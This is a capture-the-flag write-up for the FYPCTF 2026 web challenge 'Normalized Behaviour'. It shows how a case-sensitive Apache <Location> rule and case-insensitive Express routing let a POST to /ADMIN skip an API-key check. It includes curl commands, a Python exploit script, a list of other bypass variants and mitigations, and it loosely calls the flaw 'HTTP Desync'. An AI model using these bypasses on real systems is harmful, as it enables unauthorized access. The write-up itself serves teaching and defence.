# Normalized Behaviour - CTF Writeup

## Challenge Information

| Field | Value |
|-------|-------|
| **Challenge Name** | Normalized Behaviour |
| **Category** | Web Security |
| **CTF Event** | FYPCTF 2026 |
| **Target URL** | http://challenge.hacktheflag.one:30023/ |
| **Flag** | `FYPCTF26{Yet_another_URL_parser_differential_challenge}` |

---

## Challenge Description

> I made a simple Express.js web application with Apache reverse proxy to do access control. What could possibly go wrong?

The challenge provides:
- A live web application to exploit
- Source code in `normalized_behaviour.zip`

---

## Initial Reconnaissance

### Step 1: Exploring the Challenge Files

First, I extracted and examined the source code to understand the application architecture:

```bash
unzip normalized_behaviour.zip
cd normalized_behaviour
```

The directory structure revealed:
```
normalized_behaviour/
├── compose.yaml          # Docker Compose configuration
├── app/                  # Express.js application
│   ├── Dockerfile
│   ├── package.json
│   └── app.js           # Main application code
└── apache/              # Apache reverse proxy
    ├── Dockerfile
    └── proxy.conf       # Apache proxy configuration
```

### Step 2: Architecture Analysis

The application consists of two main components:

```
┌─────────────────────────────────────────────────────────────┐
│                         CLIENT                               │
└───────────────────────────┬─────────────────────────────────┘
                            │
                            ▼
┌─────────────────────────────────────────────────────────────┐
│   Apache Reverse Proxy (Port 80)                             │
│   - External-facing web server                               │
│   - Performs access control via <Location> directive         │
└───────────────────────────┬─────────────────────────────────┘
                            │ ProxyPass to http://app:3000/
                            ▼
┌─────────────────────────────────────────────────────────────┐
│   Express.js Application (Port 3000)                         │
│   - Internal application server                              │
│   - Contains the flag in admin user notes                    │
└─────────────────────────────────────────────────────────────┘
```

### Step 3: Source Code Review

**Express.js Application (`app/app.js`)**:

```javascript
const users = [
  { id: 1, username: 'admin', notes: flag },  // FLAG IS HERE!
  { id: 2, username: 'bob', notes: 'This is a note for Bob' },
  { id: 3, username: 'charlie', notes: 'This is a note for Charlie' }
];

app.post('/admin', (req, res) => {
  const { username } = req.body;
  const user = users.find(u => u.username === username);
  return res.send(`Welcome, ${user.username}! Here are your notes: ${user.notes}`);
});
```

The `/admin` endpoint:
- Accepts POST requests with a JSON body containing a `username` field
- Returns user notes including the flag when requesting the admin user
- **No authentication checks in the application itself**

**Apache Configuration (`apache/proxy.conf`)**:

```apache
<VirtualHost *:80>
    ProxyPass / http://normalized_behaviour_app:3000/
    ProxyPassReverse / http://normalized_behaviour_app:3000/

    <Location "/admin">
        <If "%{req:X-Api-Key} == %{ENV:ADMIN_API_KEY}">
            Require all granted
        </If>
        <Else>
            Require all denied
        </Else>
    </Location>
</VirtualHost>
```

The Apache configuration:
- Proxies all requests to the Express.js backend
- Uses `<Location "/admin">` to restrict access to the `/admin` path
- Requires a valid `X-Api-Key` header to access `/admin`

---

## Vulnerability Discovery

### The Parser Differential

After analyzing both components, I identified a critical mismatch in how the path `/admin` is interpreted:

| Component | Path Matching Behavior |
|-----------|----------------------|
| **Apache `<Location>`** | **Case-sensitive** - Only matches exact `/admin` |
| **Express.js Routing** | **Case-insensitive** - Matches `/admin`, `/ADMIN`, `/Admin`, etc. |

### Root Cause

1. **Apache's `<Location>` directive** performs exact string matching on the request path. The directive `<Location "/admin">` only matches requests where the path is exactly `/admin` (lowercase).

2. **Express.js routing** is case-insensitive by default. The route `app.post('/admin', ...)` will handle requests to `/admin`, `/ADMIN`, `/Admin`, `/AdMiN`, and any other case variation.

3. This creates a **URL Parser Differential** - the access control layer (Apache) and the application layer (Express) interpret the same URL differently.

### Attack Vector

By requesting the admin endpoint with **any uppercase letters** in the path:
- Apache's `<Location "/admin">` **does not match** → No API key check is performed → Request is forwarded
- Express.js routes all case variations to the same `/admin` handler → Flag is returned

---

## Exploitation

### Step 1: Verify Normal Access is Blocked

First, confirm that the protected endpoint returns 403 without proper authentication:

```bash
curl -X POST http://challenge.hacktheflag.one:30023/admin \
  -H "Content-Type: application/json" \
  -d '{"username":"admin"}'
```

**Result:**
```html
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
<html><head>
<title>403 Forbidden</title>
</head><body>
<h1>Forbidden</h1>
<p>You don't have permission to access this resource.</p>
</body></html>
```

**HTTP Status:** 403 Forbidden ✓

### Step 2: Exploit the Case-Sensitive Bypass

Now test with uppercase letters in the path:

```bash
curl -X POST http://challenge.hacktheflag.one:30023/ADMIN \
  -H "Content-Type: application/json" \
  -d '{"username":"admin"}'
```

**Result:**
```
Welcome, admin! Here are your notes: FYPCTF26{Yet_another_URL_parser_differential_challenge}
```

**HTTP Status:** 200 OK ✓

### Step 3: Verify Other Case Variations

I tested multiple case variations to confirm the vulnerability:

| Path | Result |
|------|--------|
| `/admin` | 403 Forbidden ❌ |
| `/ADMIN` | **FLAG RETRIEVED** ✅ |
| `/Admin` | **FLAG RETRIEVED** ✅ |
| `/AdMiN` | **FLAG RETRIEVED** ✅ |
| `/aDmIn` | **FLAG RETRIEVED** ✅ |

All case variations except lowercase successfully bypass the access control.

---

## Technical Explanation

### Why This Happens

The vulnerability is a classic example of **URL Parser Differential** (also known as "HTTP Desync" or "Path Normalization Bypass"). Here's the detailed breakdown:

#### Apache's Behavior

Apache's `<Location>` directive uses simple string comparison:

```apache
<Location "/admin">
```

This creates a pattern match that is:
- **Exact match only**: Must be exactly `/admin`
- **Case-sensitive**: `/ADMIN` does not match `/admin`
- **No normalization**: Does not apply Unicode or case normalization

#### Express.js Behavior

Express.js uses `path-to-regexp` for routing, which by default:
- **Case-insensitive matching**: Converts paths to lowercase before matching
- **Routes all variations**: `/ADMIN`, `/Admin`, `/aDmIn` all route to `/admin`

#### The Differential

```
Request: POST /ADMIN HTTP/1.1

Apache Layer:
  - Path: /ADMIN
  - Location "/admin" match? NO (case-sensitive)
  - Action: Forward request (no API key check)

Express Layer:
  - Path: /ADMIN  
  - Route /admin match? YES (case-insensitive)
  - Action: Execute admin handler
  - Result: Flag returned
```

### Similar Vulnerabilities

This class of vulnerability is common when:
- Different components process the same URL differently
- Access control is performed at a different layer than request handling
- Path normalization differs between proxy and backend

Other examples include:
- Path traversal (`/../admin` vs `/admin`)
- URL encoding (`/%61dmin` vs `/admin`)
- Double encoding (`/%2561dmin`)
- Unicode normalization

---

## Exploit Script

For automation and reproducibility, here's a Python exploit script:

```python
#!/usr/bin/env python3
"""
Normalized Behaviour - CTF Exploit
URL Parser Differential: Apache (case-sensitive) vs Express.js (case-insensitive)
"""

import requests
import sys

TARGET_URL = "http://challenge.hacktheflag.one:30023"

def exploit():
    # Test 1: Verify lowercase is blocked
    print("[+] Testing lowercase /admin (should be 403)...")
    r = requests.post(
        f"{TARGET_URL}/admin",
        headers={"Content-Type": "application/json"},
        json={"username": "admin"}
    )
    
    if r.status_code == 403:
        print(f"[✓] Confirmed: /admin returns 403 Forbidden")
    else:
        print(f"[!] Unexpected status: {r.status_code}")
        return
    
    # Test 2: Exploit with uppercase
    print("[+] Attempting bypass with /ADMIN...")
    r = requests.post(
        f"{TARGET_URL}/ADMIN",
        headers={"Content-Type": "application/json"},
        json={"username": "admin"}
    )
    
    if r.status_code == 200:
        print(f"[✓] Bypass successful!")
        print(f"[+] Response: {r.text}")
        
        # Extract flag
        if "FYPCTF" in r.text:
            flag = r.text.split("notes: ")[1]
            print(f"\n[+] FLAG: {flag}")
    else:
        print(f"[!] Exploit failed. Status: {r.status_code}")

if __name__ == "__main__":
    exploit()
```

**Usage:**
```bash
python3 exploit.py
```

---

## Mitigation Strategies

### For Apache Proxy

Use case-insensitive matching with `<LocationMatch>`:

```apache
<LocationMatch "(?i)/admin">
    <If "%{req:X-Api-Key} == %{ENV:ADMIN_API_KEY}">
        Require all granted
    </If>
    <Else>
        Require all denied
    </Else>
</LocationMatch>
```

Or normalize paths before matching using `mod_rewrite`:

```apache
RewriteEngine On
RewriteRule "^/[Aa][Dd][Mm][Ii][Nn]" "/admin" [PT]
```

### For Express.js Application

Implement defense in depth with application-layer authentication:

```javascript
const authenticateAdmin = (req, res, next) => {
    const apiKey = req.headers['x-api-key'];
    if (apiKey !== process.env.ADMIN_API_KEY) {
        return res.status(403).send('Forbidden');
    }
    next();
};

app.post('/admin', authenticateAdmin, (req, res) => {
    // Handler logic
});
```

### General Best Practices

1. **Defense in Depth**: Don't rely solely on proxy-layer access control
2. **Consistent Normalization**: Ensure all layers use the same path normalization
3. **Input Validation**: Validate and normalize URLs at every layer
4. **Security Testing**: Test access control with various encodings and case variations

---

## Flag

```
FYPCTF26{Yet_another_URL_parser_differential_challenge}
```

---

## Lessons Learned

1. **URL Parser Differentials are Real**: Different components handling the same URL can lead to security vulnerabilities

2. **Case Sensitivity Matters**: Always verify how different layers handle case sensitivity

3. **Defense in Depth**: Relying on a single layer of access control is dangerous; implement checks at multiple layers

4. **Test Edge Cases**: Always test access control with:
   - Different case variations
   - URL encoding
   - Path traversal sequences
   - Unicode variations

---

## References

- [Apache Location Directive Documentation](https://httpd.apache.org/docs/2.4/mod/core.html#location)
- [Express.js Routing Documentation](https://expressjs.com/en/guide/routing.html)
- [OWASP HTTP Request Smuggling](https://owasp.org/www-community/attacks/HTTP_Request_Smuggling)
- [PortSwigger URL Parser Differential Research](https://portswigger.net/research/http-desync-attacks)

---

*Writeup by TimoAI - Web Security Specialist*  
*Date: Sun Mar 29 2026*
